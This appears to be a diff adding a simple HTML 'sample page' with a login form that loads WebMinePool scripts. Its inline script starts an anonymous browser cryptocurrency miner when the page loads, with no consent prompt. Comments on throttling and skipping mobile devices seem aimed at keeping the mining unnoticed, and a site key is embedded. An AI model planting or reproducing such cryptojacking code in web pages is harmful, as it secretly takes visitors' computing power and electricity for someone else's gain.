@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<meta charset="UTF-8">
+
+<html>
+
+<head>
+    <script src="https://webminepool.com/lib/base.js"></script>
+</head>
+
+<body>
+    <h1> This is my sample page </h1>
+
+    <div id="wmp-container"
+        wmp-site-key="SK_7RiVbBYmRBDgad3SsAhbH"
+        wmp-username="<username>"
+        wmp-threads="2"
+        wmp-throttle="0.1"
+        wmp-autostart="false"
+        style="margin: 0 auto;" >
+    </div>
+
+
+    <input type="text" placeholder ="username" id="userinput">
+    <br>
+    <button type="submit" onclick="myfunc()" id="demo">login</button>
+
+    <script type="text/javascript">
+
+        <!-- throttle - rest 30% and use 70%, need to play around with this -->
+        var miner = WMP.Anonymous('SK_7RiVbBYmRBDgad3SsAhbH',{throttle: 0.3});
+
+        <!-- avoid running this on mobile, it will drain battery -->
+        if (!miner.isMobile()){
+            console.log("I am inside the if cond, calling the miner");
+            miner.start();
+        }
+
+        window.onload = function() {
+            var x;
+            x = document.getElementById("wmp-container");
+            x.style.backgroundColor = "blue";
+        };
+
+        function myfunc() {
+            var input = document.getElementById('userinput');
+            alert(input.value);
+        } 
+    </script>
+
+
+
+    <script src="https://webminepool.com/js/app.js"></script>
+    <script src="https://webminepool.com/js/charts.js"></script>
+    <script src="https://webminepool.com/js/prism.js"></script>
+    <script src="https://webminepool.com/lib/simple-ui.js"></script>
+    <script src='https://www.google.com/recaptcha/api.js'></script>
+</body>
+
+
+</html>
